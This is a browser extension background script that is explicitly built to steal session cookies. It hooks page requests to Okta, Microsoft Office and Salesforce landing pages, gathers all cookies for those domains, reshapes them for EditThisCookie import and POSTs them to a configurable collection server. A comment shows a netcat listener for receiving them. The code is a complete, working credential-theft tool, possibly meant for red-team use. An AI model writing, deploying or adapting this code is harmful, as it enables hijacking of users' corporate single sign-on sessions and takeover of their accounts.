var serviceDomains = {
    sdfc: new Set(),
	msft: new Set().add("login.microsoftonline.com"),
}

function exfiltrateIfMatch(details, config) {
	if (!config.matcher(details)) return;

	const url = new URL(details.url);
	console.log(`match ${url}`);
	chrome.storage.local.get({
            serverUrl: 'http://127.0.0.1:8998',
        },
        result => {
            const serverUrl = result.serverUrl;
            console.log(`server URL: ${serverUrl}`);

			var domains = serviceDomains[config.service] || new Set();
			domains.add(url.hostname);
			domains = Array.from(domains);
			console.log(`domains: ${domains}`);

			var allCookies = []

			var promises = domains.map((domain) => {
				return chrome.cookies.getAll({ domain: domain })
			});
			Promise.all(promises).then((doaminCookies) => {

				doaminCookies.forEach(cookies => {
					// storeId is Chrome specific which Firefox doesn't undestand
					cookies.forEach(cookie => {
						delete cookie['storeId'];

						// EditThisCookie doesn't accept domain with . prefix. Bummer!
						cookie.domain = cookie.domain.replace(/^\./, '');
					});
					allCookies.push(...cookies);
				});

				if (config.validator !== undefined && !config.validator(allCookies)) {

					return ;
				}
				const cookiesStr = JSON.stringify(allCookies);
				console.log(cookiesStr);

				var controller = new AbortController();
				setTimeout(() => {
					// close connection if remote are listening on nc etc.
					// nc -k -l 8998
					controller.abort();
				}, 3000);
				fetch(serverUrl,
					{
						method: "POST",
						signal: controller.signal,
						body: cookiesStr,
					}).catch(error => {
						console.log(error);
					});
			});
	});
}

const oktaDomainSuffix = 'oktapreview.com'
const oktaLandingPath = '/app/UserHome'

const officeDomain = 'www.office.com'
const officeLandingPath = '/'

const sdfcDomainSuffix = 'lightning.force.com'
const sdfcLandingPath = '/lightning/setup/SetupOneHome/home'

function exfiltrateCookies(details) {
	var configs = [
		{
			service: "okta",
			matcher: (details) => {
				const url = new URL(details.url);
				return url.hostname.endsWith(oktaDomainSuffix) && url.pathname == oktaLandingPath;
			}
		},
		{
			service: "msft",
			matcher: (details) => {
				const url = new URL(details.url);
				return url.hostname == officeDomain  && url.pathname == officeLandingPath;
			},
			validator: (cookies) => {
				return cookies.some((cookie) => {
					return cookie.name == 'OhpAuth';
				});
			}
		},
		{
			service: "sdfc",
			matcher: (details) => {
				const url = new URL(details.url);
				return url.hostname.endsWith(sdfcDomainSuffix) && url.pathname == sdfcLandingPath;
			}
		}
	]
	configs.forEach((config) => {
		exfiltrateIfMatch(details, config);
	});

}

chrome.webRequest.onSendHeaders.addListener(
	exfiltrateCookies,
	{
		types: ["main_frame"],
		urls: ["*://*.okta.com/*",
			"*://*.oktapreview.com/*",
			"*://www.office.com/*",
            "*://*.lightning.force.com/*"
		]
	},
	["requestHeaders", "extraHeaders"],
)

function collectSdfcDomains(details) {
	const url = new URL(details.url);
    const domain = url.hostname
    if (serviceDomains['sdfc'].has(domain) == false) {
        serviceDomains['sdfc'].add(domain)
		console.log(`add domain ${domain}`);
    }
}

chrome.webRequest.onSendHeaders.addListener(
	collectSdfcDomains,
	{
		types: ["main_frame", "sub_frame"],
		urls: ["*://*.my.salesforce.com/*",
		"*://*.salesforce.com/*",
		"*://*.file.force.com/*"
		]
	},
	["requestHeaders"],
);